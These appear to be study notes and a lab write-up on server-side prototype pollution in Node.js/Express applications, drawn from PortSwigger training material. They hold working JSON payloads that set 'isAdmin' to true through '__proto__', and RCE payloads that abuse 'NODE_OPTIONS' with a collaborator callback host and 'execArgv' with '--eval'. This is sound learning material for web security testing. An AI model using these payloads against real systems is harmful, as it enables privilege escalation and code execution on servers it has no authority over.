# Server Side prototype Pollution
 - https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/
 - Extension to help `https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8`
 - Difficult to detect cause its on server.
 - unsafely merges user-controllable input into a server-side JavaScript object.

### Detecting server-side prototype pollution via `polluted property reflection`.
 - for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.
```
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```
Ex: 
```POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

```
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```
 - Here we add "__proto__" in request, and see it being merged.
 - Any features that involve updating user data are worth investigating as these often involve merging the incoming data into an existing object that represents the user within the application.

# LAB
 - https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
 - Privilige escalation.
 - Original Request and Response
```
POST /my-account/change-address HTTP/2
Host: 0ad5002803e080678249b5c900b800d4.web-security-academy.net
Cookie: session=F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs
Content-Length: 231
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Origin: https://0ad5002803e080678249b5c900b800d4.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ad5002803e080678249b5c900b800d4.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
	"address_line_1": "Wiener HQ",
	"address_line_2": "One Wiener Way",
	"city": "Wienerville",
	"postcode": "BU1 1RP",
	"country": "UK",
	"sessionId": "F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs"
}
```
```
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"d0-C/bYHMdz0P5+PlERv2aVqQjVdR8"
Date: Thu, 29 Jun 2023 21:43:26 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 208

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false"}
```
 - I see `isAdmin`
 - Then I send
```
{
	"address_line_1": "Wiener HQ",
	"address_line_2": "One Wiener Way",
	"city": "Wienerville",
	"postcode": "BU1 1RP",
	"country": "UK",
"__proto__":{
        "foo":"bar"
    },
	"sessionId": "F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs"
}
```
```
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"foo":"bar"}
```
 - I see `foo:bar` being set.
```
{
	"address_line_1": "Wiener HQ",
	"address_line_2": "One Wiener Way",
	"city": "Wienerville",
	"postcode": "BU1 1RP",
	"country": "UK",
	"__proto__": {
		"foo": "bar",
		"isAdmin": true
	},
	"sessionId": "F0MSnC6xlW4r4kHpiCfA5aqyVPBAYoUs"
}
```

```
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"foo":"bar"}
```
 - `isAdmin` is set to true.


### Detecting server-side prototype pollution `without polluted property reflection`
 - Try injecting properties that match potential configuration options for the server.
 - You can then compare the server's behavior before and after the injection to see whether this configuration change appears to have taken effect.

##### Status code override
 - JavaScript frameworks like Express allow developers to set custom HTTP response statuses.
```
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```
 - http-errors module has this error.
```
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status > 400 || status >= 600))) {
        status = 500
    }
    //...
```
1. Find a way to trigger an error response and take note of the default status code.
2 . Try polluting the prototype with your own `**status**` property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
3. Trigger the error response again and check whether you've successfully overridden the status code.
 - You must choose a status code in the 400-599 range

##### JSON spaces override
 - The Express framework provides a json spaces option, which enables you to configure the number of spaces used to indent any JSON data in the response.
 - If you've got access to any kind of JSON response, you can try polluting the prototype with your own json spaces property.
 - Fixed in Express 4.17.4.

##### Charset override
```
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```
 - Is that character encoding being used?
 - See more details in https://portswigger.net/web-security/prototype-pollution/server-side .

 - https://portswigger.net/research/server-side-prototype-pollution
 - Burp extension `https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8`

Flawed bypass
```
 "constructor": {
        "prototype": {
            "foo": "bar"
        }
    }
```
 - See the first link for more.

## RCE
 - NODE tries to run code asynchronously, it uses `child_process` module.
 - An option can be set for these
```
  "__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```
 - The NODE_OPTIONS environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the env object, you can potentially control this via prototype pollution if it is undefined.
 - Methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses.
 - `fork()` method accepts an options object in which one of the potential options is the execArgv property.
```
"execArgv": [
    "--eval=require('<module>')"
]
```
 - In addition to `fork()`, the child_process module contains the `execSync()` method, which executes an arbitrary string as a system command.
